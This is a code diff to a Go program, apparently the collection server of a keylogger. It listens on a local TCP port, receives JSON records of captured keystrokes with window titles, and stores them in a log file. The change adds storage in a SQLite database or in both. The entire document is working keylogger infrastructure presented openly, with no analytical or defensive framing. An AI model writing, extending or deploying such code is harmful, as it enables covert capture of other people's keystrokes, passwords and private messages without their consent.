@@ -6,22 +6,33 @@
 package main
 
 import (
+	"database/sql"
 	"encoding/json"
 	"fmt"
+	_ "github.com/mattn/go-sqlite3"
 	"net"
 	"os"
 	"time"
 )
 
 const (
+	ModeLog = iota
+	ModeDB
+	ModeBoth
+
 	Protocol = "tcp"
 	Address  = "127.0.0.1:8722"
 
-	Filename   = "keylogger.log"
+	logFile    = "keylogger.log"
+	logDB      = "keylogger.db"
+	driver     = "sqlite3"
 	LogFormat  = "%s [%s] <%s> %s\n"
 	TimeFormat = "2006.01.02 15:04:05.000"
 
-	ExitListen = iota + 1
+	ExitListen = 1
+
+	schema = "CREATE TABLE IF NOT EXISTS `keylogger` (`k_time` INT NOT NULL, `k_addr` VARCHAR(21) NOT NULL, `k_type` CHAR(3) NOT NULL, `k_title` VARCHAR(255) NOT NULL, `k_value` TEXT NOT NULL);"
+	query  = "INSERT INTO `keylogger` (`k_time`, `k_addr`, `k_type`, `k_title`, `k_value`) VALUES (?, ?, ?, ?, ?);"
 )
 
 type keyLog struct {
@@ -31,16 +42,15 @@ type keyLog struct {
 	Value string `json:"value"`
 }
 
-// write appends data to the specified file.
-func (k keyLog) write(raddr string) {
+// writeLog appends data to the log file.
+func (k keyLog) writeLog(raddr string) {
 	// Format data for writing.
-	// TODO: keyLog.Title unused.
 	data := fmt.Sprintf(LogFormat, time.UnixMilli(k.Time).Format(TimeFormat), raddr, k.Type, k.Value)
 	// Open file to append data, create if file does not exist.
-	file, err := os.OpenFile(Filename, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
+	file, err := os.OpenFile(logFile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, os.ModePerm)
 	if err != nil {
 		fmt.Printf("Failed to opean file: %s\n", err.Error())
-		fmt.Printf("Failed to write:\n%s\n", data)
+		fmt.Printf("Received data: %#v\n", k)
 		return
 	}
 	defer file.Close()
@@ -48,12 +58,53 @@ func (k keyLog) write(raddr string) {
 	_, err = file.WriteString(data)
 	if err != nil {
 		fmt.Printf("Failed to write file: %s\n", err.Error())
-		fmt.Printf("Data: %s\n", data)
+		fmt.Printf("Received Data: %#v\n", k)
 		return
 	}
 }
 
+// writeDB inserts data into the database.
+func (k keyLog) writeDB(raddr string) {
+	db, err := sql.Open(driver, logDB)
+	if err != nil {
+		fmt.Printf("Failed to open database: %s\n", err.Error())
+		fmt.Printf("Received data: %#v\n", k)
+		return
+	}
+	defer db.Close()
+	_, err = db.Exec(query, k.Time, raddr, k.Type, k.Title, k.Value)
+	if err != nil {
+		fmt.Printf("Failed to insert data: %s\n", err.Error())
+		fmt.Printf("Received Data: %#v\n", k)
+		return
+	}
+}
+
+// writeBoth appends data to the log file and inserts data into the database.
+func (k keyLog) writeBoth(raddr string) {
+	k.writeLog(raddr)
+	k.writeDB(raddr)
+}
+
 func main() {
+	// According to the arguments to set recording mode.
+	var mode int
+	if len(os.Args) == 1 {
+		mode = ModeLog
+	} else {
+		switch os.Args[1] {
+		case "-db":
+			mode = ModeDB
+		case "-both":
+			mode = ModeBoth
+		default:
+			mode = ModeLog
+		}
+	}
+	// In ModeDB or ModeBoth, initialise database
+	if mode == ModeDB || mode == ModeBoth {
+		initDB()
+	}
 	// Initialise TCP listener.
 	listener, err := net.Listen(Protocol, Address)
 	if err != nil {
@@ -86,10 +137,35 @@ func main() {
 			_ = conn.Close()
 			continue
 		}
-		// Traverse and write data to file.
+		// Traverse and write data to file according to the mode.
 		for _, k := range keyLogs {
-			k.write(conn.RemoteAddr().String())
+			switch mode {
+			case ModeLog:
+				k.writeLog(conn.RemoteAddr().String())
+			case ModeDB:
+				k.writeDB(conn.RemoteAddr().String())
+			case ModeBoth:
+				k.writeBoth(conn.RemoteAddr().String())
+			}
 		}
 		_ = conn.Close()
+	}
+}
+
+// initDB creates table in database.
+func initDB() {
+	// Open database.
+	db, err := sql.Open(driver, logDB)
+	if err != nil {
+		fmt.Printf("Failed to open database: %s\n", err.Error())
+		fmt.Println("Cannot initialise database")
+		return
+	}
+	defer db.Close()
+	// Execute query to create table.
+	_, err = db.Exec(schema)
+	if err != nil {
+		fmt.Printf("Failed to intialise database: %s\n", err.Error())
+		return
 	}
 }
